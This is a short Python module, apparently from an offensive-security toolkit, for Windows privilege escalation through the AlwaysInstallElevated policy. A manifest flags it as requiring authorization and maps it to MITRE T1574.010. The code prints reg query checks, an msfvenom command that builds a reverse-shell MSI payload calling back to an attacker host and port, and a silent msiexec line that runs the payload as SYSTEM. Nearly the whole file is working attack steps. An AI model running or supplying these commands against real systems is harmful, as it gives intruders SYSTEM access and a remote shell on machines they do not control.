"""AlwaysInstallElevated registry abuse — MSI payload → SYSTEM."""

from typing import Any

MANIFEST = {
    "capability_id": "adxpl.privesc.always_install_elevated.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["privilege_escalation", "msi_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1574.010"],
}


def run(args: Any) -> int:
    command = getattr(args, "command", "cmd.exe")
    lhost = getattr(args, "lhost", None) if hasattr(args, "lhost") else None
    lport = getattr(args, "lport", "4444") if hasattr(args, "lport") else "4444"

    print("[*] AlwaysInstallElevated: MSI payload privilege escalation")

    print("\n[*] Check (both must be 1):")
    print('  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')
    print('  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')

    if lhost:
        print("\n[*] Generate MSI payload:")
        print(f"  msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f msi -o evil.msi")
    print("\n[*] Execute: msiexec /quiet /qn /i evil.msi")

    return 0
